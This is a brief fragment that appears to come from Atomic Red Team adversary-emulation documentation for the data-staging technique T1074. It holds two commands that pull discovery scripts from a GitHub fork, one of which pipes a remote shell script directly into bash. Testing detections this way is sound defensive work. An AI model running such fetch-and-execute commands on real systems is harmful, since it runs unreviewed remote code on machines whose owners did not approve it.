...
```powershell
Invoke-WebRequest "https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1074/src/Discovery.bat" -OutFile #{output_file}
```
...
```bash
curl -s https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1074/src/Discovery.sh | bash -s > #{output_file}
```
